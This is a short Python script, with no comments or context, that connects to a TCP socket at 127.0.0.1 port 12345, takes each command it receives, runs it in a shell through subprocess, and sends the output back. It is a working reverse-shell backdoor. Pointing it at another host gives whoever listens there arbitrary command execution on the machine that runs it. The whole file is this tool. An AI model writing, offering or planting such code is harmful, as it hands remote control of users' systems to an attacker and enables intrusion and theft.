import socket
import subprocess

def start_client():
    host = '127.0.0.1'
    port = 12345

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        command = client_socket.recv(1024).decode()

        if command == 'QUIT':
            break

        result = subprocess.getoutput(command)
        client_socket.send(result.encode())

    client_socket.close()

if __name__ == "__main__":
    start_client()
